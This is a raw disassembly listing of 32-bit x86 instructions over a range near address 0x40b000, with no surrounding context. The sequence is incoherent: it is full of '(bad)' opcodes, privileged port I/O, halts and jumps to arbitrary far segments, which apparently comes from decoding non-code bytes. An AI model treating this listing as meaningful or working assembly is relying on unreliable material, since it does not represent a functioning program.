  40afb4:	stc    
  40afb5:	fwait
  40afb6:	xor    al,0x8e
  40afb8:	out    0xe,eax
  40afba:	dec    esp
  40afbb:	xchg   edi,eax
  40afbc:	je     0x40af4e
  40afbe:	shl    BYTE PTR [ecx-0x70],cl
  40afc1:	dec    esi
  40afc3:	nop
  40afc4:	fwait
  40afc5:	hlt    
  40afc6:	mov    esi,0xa09037fa
  40afcb:	mov    al,ds:0x675e0bf6
  40afd0:	cmp    BYTE PTR [edi+eax*1-0x300b039f],0x1b
  40afd8:	ss ret 0x4343
  40afdc:	data16 xlat BYTE PTR ds:[ebx]
  40afde:	jl     0x40afc8
  40afe0:	je     0x40aff8
  40afe2:	pop    ds
  40afe3:	ror    DWORD PTR [ebp+0x54],cl
  40afe6:	or     DWORD PTR [esi-0x39b89fc0],esi
  40afec:	scas   eax,DWORD PTR es:[edi]
  40afed:	cmp    eax,0xf59af519
  40aff2:	popf   
  40aff3:	loopne 0x40b028
  40aff5:	mov    ds:0x4516e35f,al
  40affa:	mov    DWORD PTR [eax],esp
  40affc:	push   es
  40affd:	mov    edx,0x4653be08
  40b002:	rol    DWORD PTR [ecx],1
  40b004:	pop    es
  40b005:	adc    BYTE PTR [ebx-0x7a5d081f],bl
  40b00b:	or     dl,BYTE PTR [edi]
  40b00d:	or     BYTE PTR [esi-0x2d7b142c],al
  40b013:	test   cl,cl
  40b015:	popa   
  40b016:	stos   DWORD PTR es:[edi],eax
  40b017:	dec    esi
  40b018:	ins    BYTE PTR es:[edi],dx
  40b019:	loopne 0x40b07f
  40b01b:	jecxz  0x40b08e
  40b01d:	(bad)  
  40b01e:	repz and eax,0x9d28c661
  40b024:	std    
  40b025:	add    esp,eax
  40b027:	(bad)  
  40b029:	inc    ebx
  40b02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b02b:	mov    ds:0x776c82dc,eax
  40b030:	mov    al,ds:0x35c53126
  40b035:	push   ss
  40b036:	push   edi
  40b037:	add    eax,0xb34acc06
  40b03c:	aaa    
  40b03d:	push   ds
  40b03e:	(bad)  
  40b03f:	sub    dl,BYTE PTR [edi+eax*1+0xb]
  40b043:	sbb    DWORD PTR [edx],ebx
  40b045:	pop    es
  40b046:	gs and dh,dh
  40b049:	sti    
  40b04a:	aam    0x2f
  40b04c:	repnz retf 0x6cd1
  40b050:	xchg   ecx,eax
  40b051:	mov    eax,ds:0x118396bc
  40b056:	xchg   BYTE PTR [esi-0x6d0a6ff3],dl
  40b05c:	lock lods eax,DWORD PTR ds:[esi]
  40b05e:	push   ss
  40b05f:	add    BYTE PTR [esi],bl
  40b061:	cwde   
  40b062:	je     0x40b051
  40b064:	test   DWORD PTR [ecx-0x4cb551ef],eax
  40b06a:	icebp  
  40b06b:	rcl    ch,1
  40b06d:	xor    al,0xc1
  40b06f:	mov    ah,0xfc
  40b071:	ja     0x40b0c7
  40b073:	outs   dx,BYTE PTR ds:[esi]
  40b074:	in     eax,dx
  40b075:	retf   0x9f08
  40b078:	dec    esp
  40b079:	rol    DWORD PTR ds:0xd1d38a94,0x3
  40b080:	jb     0x40b04b
  40b082:	adc    BYTE PTR [eax-0x68743c0],bl
  40b088:	aaa    
  40b089:	(bad)  
  40b08a:	std    
  40b08b:	mov    edx,0xc55ca6d8
  40b090:	pop    esp
  40b091:	push   ds
  40b092:	fimul  WORD PTR [edi]
  40b094:	pushf  
  40b095:	sti    
  40b096:	or     al,0x72
  40b098:	ja     0x40b0e7
  40b09a:	lock add BYTE PTR [edx-0x53],0x5a
  40b09f:	and    BYTE PTR [esi+0x43],ch
  40b0a2:	mov    cl,0x29
  40b0a4:	mov    esp,0xf4a3e06a
  40b0a9:	gs or  al,0x3a
  40b0ac:	shr    DWORD PTR [ebp-0x13dac14d],cl
  40b0b2:	pop    ebx
  40b0b3:	pop    ebx
  40b0b4:	add    eax,0x4224a0b0
  40b0b9:	or     eax,esp
  40b0bb:	out    dx,al
  40b0bc:	out    0xdb,eax
  40b0be:	pop    ebp
  40b0bf:	pop    eax
  40b0c0:	lods   al,BYTE PTR ds:[esi]
  40b0c1:	mov    al,ds:0x9871863
  40b0c6:	(bad)  
  40b0c7:	pop    edi
  40b0c8:	popa   
  40b0c9:	mov    dh,0x43
  40b0cb:	cmp    al,0x50
  40b0cd:	pop    edi
  40b0ce:	sahf   
  40b0cf:	and    eax,0x73b710e4
  40b0d4:	pop    edi
  40b0d5:	hlt    
  40b0d6:	or     al,0xa2
  40b0d8:	cmp    eax,0x55a6df4
  40b0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0de:	xchg   BYTE PTR [ecx-0x56128570],bl
  40b0e4:	dec    edx
  40b0e5:	xor    eax,DWORD PTR [edi+0x66be249d]
  40b0eb:	and    dh,dh
  40b0ed:	mov    ds:0x4e7c3daa,eax
  40b0f2:	sbb    cl,BYTE PTR [ebx+0x62]
  40b0f5:	stc    
  40b0f6:	mov    dh,0xba
  40b0f8:	lock dec esp
  40b0fa:	add    eax,0x4e339507
  40b0ff:	ret    0x36ab
  40b102:	rdpmc  
  40b104:	xor    ebx,DWORD PTR [edi-0x58]
  40b107:	call   0x145d:0xb5e75c54
  40b10e:	stc    
  40b10f:	mov    es,WORD PTR [ecx+0x31f99428]
  40b115:	inc    ecx
  40b116:	sbb    al,0x33
  40b118:	sub    al,0x10
  40b11a:	int3   
  40b11b:	inc    ebx
  40b11c:	imul   eax,DWORD PTR ds:0xbcc293ef,0xfffffff9
  40b123:	fdivr  DWORD PTR [ebx-0x73]
  40b126:	fimul  DWORD PTR [edi]
  40b128:	std    
  40b129:	pop    ebx
  40b12a:	test   eax,eax
  40b12c:	mov    al,ds:0x8e0dcb1
  40b131:	mov    ebp,0x4fcef654
  40b136:	or     BYTE PTR [ecx-0x45],al
  40b139:	mov    bl,0x4c
  40b13b:	push   edi
  40b13c:	cmp    dh,BYTE PTR [eax+edx*8]
  40b13f:	es loope 0x40b0e0
  40b142:	loope  0x40b1bd
  40b144:	jae    0x40b15a
  40b146:	push   ebp
  40b147:	mov    cl,0x6b
  40b149:	cmp    edi,DWORD PTR [ebp-0x47]
  40b14c:	out    dx,al
  40b14d:	or     DWORD PTR [ebp+0x2dfa7080],esi
  40b153:	test   DWORD PTR [ecx-0x426e58df],ebp
  40b159:	imul   BYTE PTR [edx+0x1d]
  40b15c:	inc    ecx
  40b15d:	lods   eax,DWORD PTR ds:[esi]
  40b15e:	jne    0x40b124
  40b160:	lock idiv DWORD PTR [esi+eiz*2+0x12079c3]
  40b168:	push   edi
  40b169:	dec    ebx
  40b16a:	mov    cs,WORD PTR [ecx+eiz*8+0x7b]
  40b16e:	push   edx
  40b16f:	xor    esi,eax
  40b171:	sub    BYTE PTR [eax+0x2cd82b4b],0xb
  40b178:	std    
  40b179:	cmp    dh,BYTE PTR [ebx]
  40b17b:	pop    edi
  40b17c:	jmp    0xf046:0x121d45bf
  40b183:	mov    ds:0xe75b882c,al
  40b188:	dec    ebx
  40b189:	(bad)  
  40b18a:	sti    
  40b18b:	jbe    0x40b159
  40b18d:	ret    
  40b18e:	mov    cl,0xae
  40b190:	fcmove st,st(6)
  40b192:	adc    DWORD PTR [eax+esi*2],ebx
  40b195:	stc    
  40b196:	sar    DWORD PTR [ebp+edi*8+0x1c],cl
  40b19a:	inc    ebp
  40b19b:	mov    BYTE PTR [ebx+0x46],dh
  40b19e:	retf   0x3026
  40b1a1:	in     al,dx
  40b1a2:	jae    0x40b1f0
  40b1a4:	push   edi
  40b1a5:	ja     0x40b1be
  40b1a7:	fld    st(1)
  40b1a9:	clc    
  40b1aa:	sar    dh,1
  40b1ac:	icebp  
  40b1ad:	mov    BYTE PTR [eax-0x2b49d85d],ch
  40b1b3:	out    0x59,eax
  40b1b5:	outs   dx,BYTE PTR ds:[esi]
  40b1b6:	popa   
  40b1b7:	mov    ds:0x756ad45c,eax
  40b1bc:	lods   al,BYTE PTR ds:[esi]
  40b1bd:	ja     0x40b22f
  40b1bf:	lods   al,BYTE PTR ds:[esi]
  40b1c0:	add    bh,bl
  40b1c2:	mov    fs,WORD PTR [ecx+0x3b3c980e]
  40b1c8:	mul    DWORD PTR [eax]
  40b1ca:	adc    DWORD PTR [edi-0x1744885d],0xf49111d6
  40b1d4:	dec    edi
  40b1d5:	push   0xb00e621c
  40b1da:	call   0x643e:0x963088fe
  40b1e1:	rol    BYTE PTR [esp+eiz*4-0x38],cl
  40b1e5:	mov    dh,al
  40b1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1e8:	pop    es
  40b1e9:	push   0xffffffa5
  40b1eb:	outs   dx,DWORD PTR ds:[esi]
  40b1ec:	arpl   sp,si
  40b1ee:	inc    esi
  40b1ef:	gs into 
  40b1f1:	popf   
  40b1f2:	xor    eax,0x87716646
  40b1f7:	sbb    ah,BYTE PTR [esi+0x4e3af54c]
  40b1fd:	sub    esi,eax
  40b1ff:	sar    DWORD PTR [edx-0x7a],0xa
  40b203:	adc    eax,0x8a7621d8
  40b208:	push   ecx
  40b209:	test   al,0x22
  40b20b:	std    
  40b20c:	and    dl,cl
  40b20e:	sub    eax,DWORD PTR [ecx+0x428733c7]
  40b214:	pop    eax
  40b215:	push   ds
  40b216:	nop
  40b217:	ret    0x3635
  40b21a:	mov    ds,WORD PTR [ebp-0x2c037eb4]
  40b220:	push   ecx
  40b221:	repnz mov esi,gs
  40b224:	pop    di
  40b226:	popa   
  40b227:	xor    eax,0x67fceac8
  40b22c:	adc    al,al
  40b22e:	(bad)  
  40b22f:	cmc    
  40b230:	out    0x83,eax
  40b232:	sbb    DWORD PTR [esi],edx
  40b234:	imul   edx,DWORD PTR [ebx+0x0],0xe793776
  40b23b:	popf   
  40b23c:	int    0xe3
  40b23e:	sbb    al,0x35
  40b240:	mov    dh,0x56
  40b242:	adc    DWORD PTR [esi+0x7a],eax
  40b245:	inc    ebx
  40b246:	mov    al,ds:0x15b2798a
  40b24b:	loopne 0x40b233
  40b24d:	dec    edi
  40b24e:	add    eax,0x7ec30e4d
  40b253:	lea    esp,[ebx+0x58]
  40b256:	sub    al,0xa3
  40b258:	mov    bl,0x50
  40b25a:	fcmovnu st,st(2)
  40b25c:	mov    ebp,0xed45cf27
  40b262:	mov    al,ds:0xb1d7472f
  40b267:	ret    
  40b268:	pushf  
  40b269:	inc    ebp
  40b26a:	aas    
  40b26b:	or     bl,cl
  40b26d:	repz repnz adc eax,0x535cc400
  40b274:	mov    esi,0x918193c
  40b279:	mov    dl,0x2b
  40b27b:	pop    edi
  40b27c:	je     0x40b2f7
  40b27e:	xor    BYTE PTR [eax+0xf0ff351],cl
  40b284:	leave  
  40b285:	jg     0x40b27d
  40b287:	mov    DWORD PTR [ecx+0x2d454fb8],edx
  40b28d:	pop    ebx
  40b28e:	jmp    0xb8b11efa
  40b293:	and    dl,BYTE PTR [edx+0x3e8b5877]
  40b299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b29a:	sub    eax,DWORD PTR [edx-0x16dc3dc6]
  40b2a0:	push   ss
  40b2a1:	xchg   edi,eax
  40b2a2:	je     0x40b22d
  40b2a4:	jne    0x40b2a1
  40b2a6:	stc    
  40b2a7:	icebp  
  40b2a8:	jae    0x40b2ce
  40b2aa:	cmp    al,BYTE PTR [edi]
  40b2ac:	mov    eax,ds:0x428a647c
  40b2b1:	cmp    BYTE PTR [ebx-0x31],bh
  40b2b4:	ins    BYTE PTR es:[edi],dx
  40b2b5:	mov    cl,0x4
  40b2b7:	cli    
  40b2b8:	in     al,dx
  40b2b9:	iret   
  40b2ba:	call   0x6864a045
  40b2bf:	mov    eax,0x885d432e
  40b2c4:	lock sub DWORD PTR [edi+0x589a9f36],0x958d4551
  40b2cf:	dec    esp
  40b2d0:	fst    QWORD PTR [esi]
  40b2d2:	call   0x85689078
  40b2d7:	stc    
  40b2d8:	fldenv [edi-0x23]
  40b2db:	adc    al,0x76
  40b2dd:	lds    ebp,FWORD PTR ds:0xea1f4b18
  40b2e3:	xor    DWORD PTR [ebp-0x28],eax
  40b2e6:	dec    esp
  40b2e7:	push   eax
  40b2e8:	fdivr  DWORD PTR [esi+0x7dc7d626]
  40b2ee:	out    0x37,eax
  40b2f0:	mul    BYTE PTR [edx-0x3c8011e6]
  40b2f6:	or     edx,ecx
  40b2f8:	lds    ebx,FWORD PTR [ecx+0x6bed1677]
  40b2fe:	lods   al,BYTE PTR ds:[esi]
  40b2ff:	pop    ecx
  40b300:	fs cmc 
  40b302:	fisubr WORD PTR [edx-0x5]
  40b305:	data16 jbe 0x40b312
  40b308:	cmp    eax,0x6cd1345
  40b30d:	mov    eax,0x942df228
  40b312:	mov    ch,0x70
  40b314:	mov    WORD PTR [ecx+eax*8+0x23],?
  40b318:	test   BYTE PTR [edi],0x2e
  40b31b:	or     DWORD PTR [edi],edx
  40b31d:	jge    0x40b387
  40b31f:	dec    edi
  40b320:	mov    edi,0x5424af60
  40b325:	or     ecx,DWORD PTR [edx-0x630b46bd]
  40b32b:	xchg   esi,eax
  40b32c:	xor    ecx,DWORD PTR [edi-0x69923962]
  40b332:	xchg   ebp,eax
  40b333:	cmc    
  40b334:	mov    al,0x64
  40b336:	loopne 0x40b30e
  40b338:	xor    edx,DWORD PTR [edx+0x753fbbe5]
  40b33e:	adc    al,0xc1
  40b340:	jmp    0x23e038b
  40b345:	int3   
  40b346:	mov    al,ds:0xa1c71e65
  40b34b:	mov    ds:0x87adf6ff,eax
  40b350:	jge    0x40b305
  40b352:	and    DWORD PTR [ebx+0x1b],eax
  40b355:	ds sub esp,ebp
  40b358:	adc    al,0xed
  40b35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b35b:	int    0x2a
  40b35d:	sub    ah,ch
  40b35f:	dec    ecx
  40b360:	pop    edi
  40b361:	or     BYTE PTR [edi],ch
  40b363:	(bad)  
  40b364:	stos   DWORD PTR es:[edi],eax
  40b365:	inc    eax
  40b366:	jl     0x40b2f0
  40b368:	adc    dl,ah
  40b36a:	mov    edi,0xbb78eaab
  40b36f:	or     BYTE PTR [edx+0x46],ch
  40b372:	push   ebp
  40b373:	pop    esi
  40b374:	jmp    0xdc5fd70e
  40b379:	push   ebp
  40b37a:	xor    BYTE PTR [edx+0x29],dh
  40b37d:	sub    BYTE PTR [ebp-0x47],bh
  40b380:	mov    edi,0xfda1c26
  40b385:	pop    esp
  40b386:	dec    ebp
  40b387:	mov    bl,0x46
  40b389:	(bad)  [eax]
  40b38b:	fmul   DWORD PTR [ebx]
  40b38d:	pushf  
  40b38e:	mov    bh,0x11
  40b390:	daa    
  40b391:	push   ds
  40b392:	mov    ds:0x95c97f25,al
  40b397:	xchg   BYTE PTR [ebx],dh
  40b399:	inc    esp
  40b39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b39b:	jge    0x40b3d5
  40b39d:	sub    ecx,0x24a744fb
  40b3a3:	out    0xfa,eax
  40b3a5:	jecxz  0x40b3fb
  40b3a7:	or     DWORD PTR [edi+eiz*4+0x69],ebx
  40b3ab:	adc    BYTE PTR [ecx],dl
  40b3ad:	xchg   cl,ch
  40b3af:	sahf   
  40b3b0:	ffree  st(5)
  40b3b2:	imul   edx,ebp,0x6
  40b3b5:	call   0x751c:0xdef970ed
  40b3bc:	sub    ch,BYTE PTR ds:0x52b0b16c
  40b3c2:	iret   
  40b3c3:	stos   DWORD PTR es:[edi],eax
  40b3c4:	test   eax,0x70b1e49e
  40b3c9:	add    DWORD PTR [ebx-0x443964a3],0x38dc9596
  40b3d3:	test   DWORD PTR [eax+0x7c],esi
  40b3d6:	fmul   st,st(2)
  40b3d8:	jne    0x40b41d
  40b3da:	push   es
  40b3db:	out    0xbf,al
  40b3dd:	mov    WORD PTR [eax+0x3d],cs
  40b3e0:	inc    esp
  40b3e1:	sub    dl,BYTE PTR [edi]
  40b3e3:	fimul  WORD PTR ds:0x473aec15
  40b3e9:	sbb    DWORD PTR [eax-0x1ec0aa07],ebx
  40b3ef:	push   esi
  40b3f0:	xor    edi,DWORD PTR [eax]
  40b3f2:	and    al,0xb5
  40b3f4:	std    
  40b3f5:	rcr    BYTE PTR [esi+edi*8],cl
  40b3f8:	adc    al,0xd6
  40b3fa:	jmp    0x40b433
  40b3fc:	shr    DWORD PTR [esi-0x4e],cl
  40b3ff:	lss    ebx,FWORD PTR [ebx]
  40b402:	inc    edi
  40b403:	dec    eax
  40b404:	outs   dx,BYTE PTR ds:[esi]
  40b405:	jge    0x40b43d
  40b407:	jae    0x40b40e
  40b409:	bound  ecx,QWORD PTR [edx]
  40b40b:	fwait
  40b40c:	ss push edx
  40b40e:	sbb    ebp,DWORD PTR [ebp+0x4e830f37]
  40b414:	les    ecx,FWORD PTR [ecx]
  40b416:	sbb    ah,BYTE PTR ds:0x2dc58a13
  40b41c:	dec    eax
  40b41d:	mov    ch,0xcf
  40b41f:	scas   eax,DWORD PTR es:[edi]
  40b420:	pop    ds
  40b421:	xchg   esp,eax
  40b422:	adc    al,0xab
  40b424:	add    eax,0x53e4d693
  40b429:	dec    ebp
  40b42a:	cmp    al,cl
  40b42c:	in     al,0x66
  40b42e:	push   cs
  40b42f:	jle    0x40b40a
  40b431:	mov    BYTE PTR [edx+0x22],cl
  40b434:	adc    bl,ah
  40b436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b437:	or     esi,DWORD PTR [ecx]
  40b439:	mov    eax,0x9c478bae
  40b43e:	int3   
  40b43f:	cs jge 0x40b433
  40b442:	jb     0x40b47a
  40b444:	dec    edi
  40b445:	cmc    
  40b446:	popf   
  40b447:	sbb    eax,0xc3ca65d4
  40b44c:	adc    BYTE PTR [ebx+0x6db97be2],0xff
  40b453:	pop    ss
  40b454:	jbe    0x40b44b
  40b456:	scas   al,BYTE PTR es:[edi]
  40b457:	retf   0x30b9
  40b45a:	push   0x693b4703
  40b45f:	adc    eax,0xed108153
  40b464:	adc    bl,BYTE PTR [esi+ebx*8+0x51]
  40b468:	je     0x40b4c7
  40b46a:	sbb    DWORD PTR [eax],ebp
  40b46c:	dec    ebp
  40b46d:	push   eax
  40b46e:	out    dx,al
  40b46f:	sbb    BYTE PTR [ecx+0x1e8084c6],0xe9
  40b476:	sub    dl,dh
  40b478:	pop    es
  40b479:	mov    ds:0x698b288d,eax
  40b47e:	gs mov edi,0xa4e985
  40b484:	push   ds
  40b485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b486:	jl     0x40b496
  40b488:	sub    ebx,DWORD PTR [ebx]
  40b48a:	mov    ebx,DWORD PTR [ebx+edx*1]
  40b48d:	bound  edi,QWORD PTR [edx-0x66]
  40b490:	cs add esp,esi
  40b493:	adc    al,0x9f
  40b495:	imul   edi,DWORD PTR [edi+ebp*2+0x39],0xa
  40b49a:	sahf   
  40b49b:	jns    0x40b49f
  40b49d:	add    esi,ebx
  40b49f:	or     eax,DWORD PTR [edi+0x307a9fbd]
  40b4a5:	outs   dx,BYTE PTR ds:[esi]
  40b4a6:	out    0xa3,al
  40b4a8:	int    0x40
  40b4aa:	pop    ecx
  40b4ab:	or     esi,DWORD PTR [esi+0x2ac42609]
  40b4b1:	pop    edi
  40b4b2:	push   ecx
  40b4b3:	(bad)  
  40b4b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4b5:	cmp    eax,0xafd27b36
  40b4ba:	std    
  40b4bb:	jns    0x40b47e
  40b4bd:	push   0x6d
  40b4bf:	shl    BYTE PTR [edi],cl
  40b4c1:	xor    ebx,esp
  40b4c3:	mov    ebp,0xe5df7032
  40b4c8:	retf   0x8f7
  40b4cb:	std    
  40b4cc:	xchg   edi,eax
  40b4cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4ce:	loopne 0x40b487
  40b4d0:	or     eax,0x9f5952f7
  40b4d5:	fsub   DWORD PTR ds:0x14967c03
  40b4db:	dec    esi
  40b4dc:	(bad)  
  40b4dd:	data16 je 0x40b55a
  40b4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4e1:	inc    ebx
  40b4e2:	inc    esi
  40b4e3:	jp     0x40b54a
  40b4e5:	or     bh,BYTE PTR [esi+0x469df5ef]
  40b4eb:	xchg   ebx,eax
  40b4ec:	outs   dx,BYTE PTR ds:[esi]
  40b4ed:	(bad)  
  40b4ee:	aaa    
  40b4ef:	xor    esp,DWORD PTR [ebx]
  40b4f1:	pop    eax
  40b4f2:	ja     0x40b517
  40b4f4:	jp     0x40b4fe
  40b4f6:	or     al,0x93
  40b4f8:	popa   
  40b4f9:	mov    ?,WORD PTR [edi-0xc8d799e]
  40b4ff:	into   
  40b500:	repnz and al,0x2f
  40b503:	lahf   
  40b504:	sahf   
  40b505:	mov    al,ds:0x8bf71a26
  40b50a:	mov    eax,ds:0xb4db199
  40b50f:	ss je  0x40b4f1
  40b512:	pushf  
  40b513:	enter  0xf747,0xc6
  40b517:	aas    
  40b518:	push   edi
  40b519:	test   BYTE PTR [esi-0x5f],dh
  40b51c:	xchg   ebx,eax
  40b51d:	cli    
  40b51e:	aam    0x20
  40b520:	mov    al,ds:0x92e9dc3f
  40b525:	xor    ch,bl
  40b527:	jbe    0x40b55f
  40b529:	mov    gs,WORD PTR [ecx-0x10]
  40b52c:	sbb    esp,DWORD PTR [eax]
  40b52e:	outs   dx,BYTE PTR ds:[esi]
  40b52f:	(bad)  
  40b530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b531:	dec    edi
  40b532:	and    al,0x4e
  40b534:	cmp    ecx,edx
  40b536:	(bad)  
  40b537:	xor    bh,bl
  40b539:	xor    BYTE PTR [edx+0x52],0x24
  40b53d:	mov    edi,0x4c53df72
  40b542:	fs push 0x1
  40b545:	mov    dh,0x14
  40b547:	cmc    
  40b548:	cmp    ch,BYTE PTR [eax+0x6b]
  40b54b:	outs   dx,BYTE PTR ds:[esi]
  40b54c:	pop    esi
  40b54d:	(bad)  
  40b54e:	add    esp,edi
  40b550:	sbb    BYTE PTR [eax+edx*4-0xc],ah
  40b554:	scas   al,BYTE PTR es:[edi]
  40b555:	das    
  40b556:	push   eax
  40b557:	xchg   ebp,eax
  40b558:	inc    edi
  40b559:	lods   eax,DWORD PTR ds:[esi]
  40b55a:	js     0x40b570
  40b55c:	lds    edx,FWORD PTR ds:0x77b7ba7a
  40b562:	loop   0x40b587
  40b564:	adc    DWORD PTR [ebx+0x3d4cf6d1],0xb6224299
  40b56e:	daa    
  40b56f:	pushf  
  40b570:	dec    edx
  40b571:	popf   
  40b572:	imul   eax,DWORD PTR [esi-0x7002776a],0x53
  40b579:	jg     0x40b5eb
  40b57b:	mov    cs,WORD PTR [esi+0x47]
  40b57e:	js     0x40b550
  40b580:	xchg   DWORD PTR [esp+ecx*1],esp
  40b583:	mov    cl,0x3e
  40b585:	cmp    ch,dh
  40b587:	pop    eax
  40b588:	push   esi
  40b589:	and    bh,al
  40b58b:	stos   BYTE PTR es:[edi],al
  40b58c:	cwde   
  40b58d:	jno    0x40b5c6
  40b58f:	rcl    BYTE PTR [ebx-0x7b],0xac
  40b593:	dec    esp
  40b594:	sbb    BYTE PTR [edi],al
  40b596:	and    dh,BYTE PTR [esi-0x4bbe945f]
  40b59c:	cs push ds
  40b59e:	and    bh,BYTE PTR [esi]
  40b5a0:	test   ecx,edi
  40b5a2:	sub    ebx,esi
  40b5a4:	add    esi,DWORD PTR [edx-0x8]
  40b5a7:	ret    0x6e5
  40b5aa:	push   esi
  40b5ab:	jp     0x40b596
  40b5ad:	xchg   ecx,eax
  40b5ae:	push   0xfffffff5
  40b5b0:	sbb    BYTE PTR [ecx],dh
  40b5b2:	sub    esi,esi
  40b5b4:	stos   DWORD PTR es:[edi],eax
  40b5b5:	in     eax,dx
  40b5b6:	inc    edx
  40b5b7:	ins    DWORD PTR es:[edi],dx
  40b5b8:	jl     0x40b638
  40b5ba:	cli    
  40b5bb:	gs xchg esp,eax
  40b5bd:	xchg   esp,eax
  40b5be:	dec    edx
  40b5bf:	cwde   
  40b5c0:	mov    ebp,0x62b2b3bf
  40b5c5:	jl     0x40b5ba
  40b5c7:	retf   0xdf43
  40b5ca:	imul   ecx,DWORD PTR [edx],0xffffff90
  40b5cd:	mov    eax,0xe11d9b23
  40b5d2:	daa    
  40b5d3:	xor    DWORD PTR [esi],edx
  40b5d5:	cmp    bh,dh
  40b5d7:	jo     0x40b655
  40b5d9:	mov    ecx,0xa7ea5e45
  40b5de:	loope  0x40b5bf
  40b5e0:	mov    ds:0x80c56417,al
  40b5e5:	add    esp,eax
  40b5e7:	daa    
  40b5e8:	xchg   ecx,eax
  40b5e9:	and    al,0xec
  40b5eb:	int3   
  40b5ec:	mov    al,ds:0x76acb838
  40b5f1:	sub    eax,esp
  40b5f3:	nop
  40b5f4:	mov    ebp,0xc257938c
  40b5f9:	add    al,BYTE PTR [esi]
  40b5fb:	(bad)  
  40b5fc:	cwde   
  40b5fd:	or     DWORD PTR [edi],ecx
  40b5ff:	mov    esi,0x5bcce887
  40b604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b605:	jp     0x40b613
  40b607:	mov    ebx,0xa055aada
  40b60c:	les    esi,FWORD PTR [esi-0x58]
  40b60f:	pusha  
  40b610:	aas    
  40b611:	hlt    
  40b612:	ret    
  40b613:	sub    edx,DWORD PTR [ecx+0x2f1d0f4f]
  40b619:	ret    0x7ca3
  40b61c:	out    dx,eax
  40b61d:	and    BYTE PTR [esi+esi*2-0x1b],bh
  40b621:	loopne 0x40b632
  40b623:	and    BYTE PTR [eax+0x617232fe],0x10
  40b62a:	sub    BYTE PTR ds:[edx+eax*2],cl
  40b62e:	cmp    BYTE PTR [esi+0x91f6f0e],cl
  40b634:	cmp    eax,0x9efa0017
  40b639:	sbb    eax,0xa13b0654
  40b63e:	xchg   esi,eax
  40b63f:	shr    BYTE PTR [esi+0x1aff2074],1
  40b645:	shl    DWORD PTR [ebp+0x39a9677f],0xd2
  40b64c:	push   ebx
  40b64d:	sbb    al,0xcd
  40b64f:	jae    0x40b5f4
  40b651:	adc    eax,0x21dbfe32
  40b656:	sub    ebx,DWORD PTR [esi-0x2f69c98a]
  40b65c:	es pop es
  40b65e:	cmp    edx,edi
  40b660:	cld    
  40b661:	outs   dx,DWORD PTR ds:[esi]
  40b662:	push   0x3720bbda
  40b667:	mov    edx,0x11a9ff37
  40b66c:	js     0x40b5fe
  40b66e:	ss xor eax,0xd47e0f8a
  40b674:	or     BYTE PTR [eax-0x4f],bl
  40b677:	or     edx,DWORD PTR [edi]
  40b679:	es aad 0x8
  40b67c:	fsub   QWORD PTR [ebp+edi*2-0x79]
  40b680:	mov    al,ds:0x4dbe6ceb
  40b685:	adc    eax,0xbcdecb84
  40b68a:	js     0x40b681
  40b68c:	mov    cl,ch
  40b68e:	jg     0x40b6ca
  40b690:	jge    0x40b653
  40b692:	inc    eax
  40b693:	cli    
  40b694:	mov    cl,0xda
  40b696:	mov    edx,cs
  40b698:	sub    al,0x78
  40b69a:	int3   
  40b69b:	lock push esp
  40b69d:	mov    WORD PTR [ebp-0x3b],fs
  40b6a0:	in     al,dx
  40b6a1:	push   ss
  40b6a2:	sbb    DWORD PTR [ebx-0x616f56b8],edi
  40b6a8:	sbb    BYTE PTR [edi],ah
  40b6aa:	pop    esp
  40b6ab:	dec    edi
  40b6ac:	fsubr  QWORD PTR [esi]
  40b6ae:	push   esi
  40b6af:	cmp    BYTE PTR [ecx+edi*2+0x1f36351a],cl
  40b6b6:	jo     0x40b6bf
  40b6b8:	xor    esp,DWORD PTR [ebp+0x425193a3]
  40b6be:	or     ah,ah
  40b6c0:	sbb    BYTE PTR [edi],al
  40b6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6c3:	stos   BYTE PTR es:[edi],al
  40b6c4:	xchg   ecx,eax
  40b6c5:	mov    al,ds:0xd67cb31e
  40b6ca:	and    DWORD PTR [edi],edx
  40b6cc:	mov    WORD PTR [eax-0x690d877],ds
  40b6d2:	sar    ebx,cl
  40b6d4:	inc    ebx
  40b6d5:	push   DWORD PTR [ebp+ecx*1-0x1e]
  40b6d9:	sbb    BYTE PTR [ebp+0x3b],al
  40b6dc:	lods   al,BYTE PTR ds:[esi]
  40b6dd:	pop    edx
  40b6de:	ret    
  40b6df:	cmp    eax,0x746bfcac
  40b6e4:	aas    
  40b6e5:	mov    dl,0xfd
  40b6e7:	stos   DWORD PTR es:[edi],eax
  40b6e8:	out    0x73,eax
  40b6ea:	mov    al,0xca
  40b6ec:	cs call 0x57df:0x9898de56
  40b6f4:	int3   
  40b6f5:	sub    eax,esp
  40b6f7:	ds in  eax,0x14
  40b6fa:	arpl   WORD PTR [edi+esi*8+0xc49e8c5],cx
  40b701:	aam    0xb6
  40b703:	ja     0x40b689
  40b705:	push   cs
  40b706:	test   DWORD PTR [ecx+0xcce12a5],edx
  40b70c:	jg     0x40b6b5
  40b70e:	loop   0x40b754
  40b710:	test   BYTE PTR [ebp+eax*2-0x5e],ah
  40b714:	xor    BYTE PTR [eax+0x45],0x19
  40b718:	stos   DWORD PTR es:[edi],eax
  40b719:	push   ss
  40b71a:	xor    eax,DWORD PTR [edi-0x49]
  40b71d:	add    eax,0x15502f7d
  40b722:	gs xchg esi,eax
  40b724:	cmp    al,0x6a
  40b726:	push   ebx
  40b727:	and    al,0x49
  40b729:	and    BYTE PTR [esi-0x2e],0x95
  40b72d:	mov    esp,0xe73e3703
  40b732:	jno    0x40b768
  40b734:	int3   
  40b735:	lock add eax,0xe1a49048
  40b73b:	inc    esi
  40b73c:	mov    bl,ch
  40b73e:	pop    esi
  40b73f:	adc    bl,BYTE PTR [ebx-0xa]
